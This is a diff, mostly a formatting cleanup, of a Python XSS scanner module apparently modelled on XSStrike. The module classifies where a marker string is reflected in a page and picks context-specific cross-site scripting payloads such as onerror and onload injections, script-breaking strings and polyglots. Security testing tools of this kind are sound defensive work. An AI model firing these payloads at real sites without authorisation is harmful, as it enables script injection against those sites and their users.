@@ -13,9 +13,8 @@ Context types:
 """
 
 import re
-from dataclasses import dataclass, field
-from typing import Dict, List, Optional, Tuple
-
+from dataclasses import dataclass
+from typing import Dict, List, Tuple
 
 XSS_CHECKER = "vXSScH3ck3r"  # Unique marker string for context analysis (XSStrike concept)
 
@@ -23,13 +22,14 @@ XSS_CHECKER = "vXSScH3ck3r"  # Unique marker string for context analysis (XSStri
 @dataclass
 class ReflectionContext:
     """Describes where and how user input appears in the response."""
-    position: int = 0           # Byte offset in the response
-    context: str = "unknown"    # script / attribute / html / comment / bad
-    tag: str = ""               # HTML tag name (for attribute context)
-    attr_type: str = ""         # name / value / flag (for attribute context)
-    quote_char: str = ""        # Surrounding quote character (for attribute/script context)
-    attr_name: str = ""         # Attribute name (for attribute context)
-    attr_value: str = ""        # Attribute value (for attribute context)
+
+    position: int = 0  # Byte offset in the response
+    context: str = "unknown"  # script / attribute / html / comment / bad
+    tag: str = ""  # HTML tag name (for attribute context)
+    attr_type: str = ""  # name / value / flag (for attribute context)
+    quote_char: str = ""  # Surrounding quote character (for attribute/script context)
+    attr_name: str = ""  # Attribute name (for attribute context)
+    attr_value: str = ""  # Attribute value (for attribute context)
 
     def is_executable(self) -> bool:
         """Can this reflection context be exploited for XSS?"""
@@ -45,7 +45,7 @@ def analyze_reflection(response_text: str, payload_marker: str = XSS_CHECKER) ->
     """
     raw = response_text
     # Strip comments for analysis (input inside comments can't execute)
-    clean = re.sub(r'<!--.*?-->', '', raw, flags=re.DOTALL)
+    clean = re.sub(r"<!--.*?-->", "", raw, flags=re.DOTALL)
 
     contexts: Dict[int, ReflectionContext] = {}
 
@@ -62,7 +62,7 @@ def analyze_reflection(response_text: str, payload_marker: str = XSS_CHECKER) ->
 
     # ── 2. Attribute context ──
     # Find marker inside HTML tag attributes
-    attr_pattern = re.compile(r'<[^>]*?' + re.escape(payload_marker) + r'[^>]*?>')
+    attr_pattern = re.compile(r"<[^>]*?" + re.escape(payload_marker) + r"[^>]*?>")
     for match in attr_pattern.finditer(clean):
         tag_text = match.group(0)
         pos = match.start() + tag_text.find(payload_marker)
@@ -81,7 +81,7 @@ def analyze_reflection(response_text: str, payload_marker: str = XSS_CHECKER) ->
 
     # ── 4. Comment context ──
     # Marker appears inside <!-- ... --> (already stripped, check original)
-    comment_pattern = re.compile(r'<!--.*?' + re.escape(payload_marker) + r'.*?-->', re.DOTALL)
+    comment_pattern = re.compile(r"<!--.*?" + re.escape(payload_marker) + r".*?-->", re.DOTALL)
     for match in comment_pattern.finditer(raw):
         pos = match.start() + match.group().find(payload_marker)
         if pos in contexts:
@@ -91,9 +91,7 @@ def analyze_reflection(response_text: str, payload_marker: str = XSS_CHECKER) ->
 
     # ── 5. Bad (non-executable) contexts ──
     bad_pattern = re.compile(
-        r'<(style|template|textarea|title|noembed|noscript)>.*?'
-        + re.escape(payload_marker)
-        + r'.*?</\1>',
+        r"<(style|template|textarea|title|noembed|noscript)>.*?" + re.escape(payload_marker) + r".*?</\1>",
         re.DOTALL | re.IGNORECASE,
     )
     for match in bad_pattern.finditer(clean):
@@ -113,72 +111,75 @@ def select_payload(context: ReflectionContext) -> List[str]:
     """
     if context.context == "script":
         # Inside <script> tag — need to escape the JS context
-        payloads = [
-            f"</script><img src=x onerror=alert(1)>",
-            f"';alert(1);//",
-            f'\";alert(1);//',
-            f'-alert(1)-',
-            f'\\-alert(1)//',
-        ]
         if context.quote_char == "'":
-            return [f"';alert(1);//", f"</script><img src=x onerror=alert(1)>", f"'-alert(1)-'"]
+            return ["';alert(1);//", "</script><img src=x onerror=alert(1)>", "'-alert(1)-'"]
         elif context.quote_char == '"':
-            return [f'\";alert(1);//', f"</script><img src=x onerror=alert(1)>", f'\"-alert(1)-\"']
+            return ['";alert(1);//', "</script><img src=x onerror=alert(1)>", '"-alert(1)-"']
         else:
-            return [f";alert(1);//", f"</script><img src=x onerror=alert(1)>"]
+            return [";alert(1);//", "</script><img src=x onerror=alert(1)>"]
 
     elif context.context == "attribute":
         if context.attr_type == "value" and context.quote_char:
             q = context.quote_char
-            tag = context.tag.lower()
             # Check for event handler attributes
             event_handlers = [
-                "onload", "onerror", "onclick", "onfocus", "onmouseover",
-                "onmouseout", "onkeydown", "onkeyup", "onchange", "onsubmit",
-                "ontoggle", "onanimationend", "onpause", "onplay",
+                "onload",
+                "onerror",
+                "onclick",
+                "onfocus",
+                "onmouseover",
+                "onmouseout",
+                "onkeydown",
+                "onkeyup",
+                "onchange",
+                "onsubmit",
+                "ontoggle",
+                "onanimationend",
+                "onpause",
+                "onplay",
             ]
             if any(context.attr_name.lower().startswith(eh) for eh in event_handlers):
-                return [f"alert(1)"]
+                return ["alert(1)"]
             # Regular attribute value — close quote and inject event handler
             return [
-                f'{q}><img src=x onerror=alert(1)>',
-                f'{q} autofocus onfocus=alert(1) {q}',
-                f'{q} onmouseover=alert(1) x={q}',
+                f"{q}><img src=x onerror=alert(1)>",
+                f"{q} autofocus onfocus=alert(1) {q}",
+                f"{q} onmouseover=alert(1) x={q}",
             ]
         else:
             # Attribute name or flag
             return [
-                f' onmouseover=alert(1) x=',
-                f'><img src=x onerror=alert(1)>',
+                " onmouseover=alert(1) x=",
+                "><img src=x onerror=alert(1)>",
             ]
 
     elif context.context == "html":
         # Raw HTML body — just inject a tag
         return [
-            f'<img src=x onerror=alert(1)>',
-            f'<svg onload=alert(1)>',
-            f'<body onload=alert(1)>',
+            "<img src=x onerror=alert(1)>",
+            "<svg onload=alert(1)>",
+            "<body onload=alert(1)>",
         ]
 
     elif context.context in ("comment", "bad"):
         # Cannot exploit — only escape and try to break out
         if context.context == "comment":
-            return [f'--><img src=x onerror=alert(1)>']
+            return ["--><img src=x onerror=alert(1)>"]
         else:
-            return [f'</{context.tag}><img src=x onerror=alert(1)>']
+            return [f"</{context.tag}><img src=x onerror=alert(1)>"]
 
     else:
         # Unknown context — use polyglots
         return [
-            f'"\'><img src=x onerror=alert(1)>',
-            f'"><svg onload=alert(1)>',
+            "\"'><img src=x onerror=alert(1)>",
+            '"><svg onload=alert(1)>',
         ]
 
 
 def _extract_scripts(html: str) -> List[Tuple[str, int]]:
     """Extract all <script>...</script> blocks with their offsets."""
     results = []
-    pattern = re.compile(r'<script[^>]*>(.*?)</script>', re.DOTALL | re.IGNORECASE)
+    pattern = re.compile(r"<script[^>]*>(.*?)</script>", re.DOTALL | re.IGNORECASE)
     for match in pattern.finditer(html):
         results.append((match.group(1), match.start(1)))
     return results
@@ -188,14 +189,13 @@ def _find_quote_context(text: str, pos: int) -> str:
     """Find the nearest surrounding quote character before position `pos`."""
     before = text[:pos]
     # Walk backwards to find first unescaped quote
-    quotes = []
     for i in range(len(before) - 1, -1, -1):
-        if before[i] in ("'", '"', '`'):
+        if before[i] in ("'", '"', "`"):
             # Check if escaped
-            if i > 0 and before[i-1] == '\\':
+            if i > 0 and before[i - 1] == "\\":
                 continue
             return before[i]
-        if before[i] in (';', '\n', '=', '(', ')', '+', '-', ' '):
+        if before[i] in (";", "\n", "=", "(", ")", "+", "-", " "):
             continue
     return ""
 
@@ -215,7 +215,7 @@ def _parse_attribute_context(tag_text: str, marker: str, ctx: ReflectionContext)
                 # Find the quote character
                 eq_idx = part.index("=")
                 name = part[:eq_idx].strip()
-                value_part = part[eq_idx + 1:].strip()
+                value_part = part[eq_idx + 1 :].strip()
 
                 quote_match = re.match(r'([\'"`])', value_part)
                 if quote_match:
@@ -248,7 +248,7 @@ def _split_tag_parts(tag_inner: str) -> List[str]:
             current += ch
             in_quote = True
             quote_char = ch
-        elif ch in (' ', '\t', '\n'):
+        elif ch in (" ", "\t", "\n"):
             if current.strip():
                 parts.append(current.strip())
                 current = ""
